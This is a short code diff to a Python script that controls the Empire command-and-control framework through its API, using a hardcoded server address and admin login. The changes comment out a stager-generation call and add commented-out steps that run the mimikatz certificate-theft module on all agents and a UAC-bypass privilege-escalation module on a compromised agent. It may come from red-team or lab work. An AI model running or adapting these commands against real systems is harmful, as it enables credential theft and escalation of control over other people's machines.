@@ -22,4 +22,21 @@ api = EmpireAPIWrapper.empireAPI('10.15.20.157', uname='empireadmin', passwd='Pa
 ##### Stagers
 # print(api.get_stagers())
 # print(api.get_stager_by_name('launcher'))
-print(api.gen_stager(StagerName='launcher', listener='victor'))
+# print(api.gen_stager(StagerName='launcher', listener='victor'))
+
+##### Modules
+# print(api.modules())
+# print(api.module_by_name('credentials/mimikatz/certs'))
+# data = {'Agent': 'all'}
+# print(api.exec_module('credentials/mimikatz/certs', options=data))
+
+
+##### Agents
+# agent = api.agents()
+# for agent_id in agent['agents']:
+#     for key in agent_id:
+#         pass # print('{}:\t\t{}'.format(key, agent_id[key]))
+#
+# agent_name = agent['agents'][0]['name']
+# data = {'Agent': agent_name, 'Listener': 'victor'}
+# print(api.exec_module('privesc/bypassuac', options=data))
